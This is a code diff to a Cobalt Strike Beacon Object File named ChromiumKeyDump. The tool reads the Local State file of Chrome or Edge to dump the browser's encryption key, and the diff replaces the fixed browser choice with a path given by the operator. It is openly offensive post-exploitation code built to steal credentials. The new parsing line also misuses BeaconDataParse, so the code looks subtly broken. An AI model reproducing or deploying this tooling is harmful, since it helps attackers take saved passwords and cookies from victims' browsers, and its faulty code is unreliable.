@@ -25,6 +25,8 @@ BOF_REDECLARE(NTDLL, memcpy);
 BOF_REDECLARE(KERNEL32, lstrcatW);
 BOF_REDECLARE(KERNEL32, lstrlenW);
 BOF_REDECLARE(KERNEL32, GetLastError);
+BOF_REDECLARE(MSVCRT, mbstowcs);
+BOF_REDECLARE(MSVCRT, strlen);
 
 #define BOF_LOCALS \
     BOF_LOCAL(KERNEL32, ReadFile); \
@@ -42,42 +44,21 @@ BOF_REDECLARE(KERNEL32, GetLastError);
     BOF_LOCAL(KERNEL32, lstrcatW); \
     BOF_LOCAL(KERNEL32, lstrlenW); \
     BOF_LOCAL(KERNEL32, GetLastError);
-
+    BOF_LOCAL(MSVCRT, mbstowcs);
+    BOF_LOCAL(MSVCRT, strlen);
 
 extern "C" void go(char* args, int alen) {
     BOF_LOCALS;
 
-    if (alen < 4) {
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Browser type not selected\n");
-        return;
-    }
-
     datap  parser;
-    int browser_type;
+    char *path;
+
     BeaconDataParse(&parser, args, alen);
-    browser_type = BeaconDataInt(&parser);
+    path = BeaconDataParse(&parser);
 
     WCHAR szFilePath[MAX_PATH];
-    GUID local_FOLDERID_LocalAppData = { 0xF1B32785, 0x6FBA, 0x4FCF, 0x9D, 0x55, 0x7B, 0x8E, 0x7F, 0x15, 0x70, 0x91 };
-
-    PWSTR appdate;
-    HRESULT result;
-    if ((result = SHGetKnownFolderPath(local_FOLDERID_LocalAppData, 0, 0, &appdate)) != ((HRESULT)0L)) {
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] SHGetKnownFolderPath failed hresult=%08x\n", result);
-        return;
-    }
-
-    memcpy(szFilePath, appdate, lstrlenW(appdate) * 2 + 2);
-    
-    if (browser_type == 0) {
-        lstrcatW(szFilePath, L"\\Google\\Chrome\\User Data\\Local State");
-    }
-    else if (browser_type == 1) {
-        lstrcatW(szFilePath, L"\\Microsoft\\Edge\\User Data\\Local State");
-    }
-    else {
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Wrong browser selected\n");
-    }
+    const size_t size = strlen(path) + 1;
+    mbstowcs(szFilePath, path, size);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Target File: %S\n", szFilePath);
 
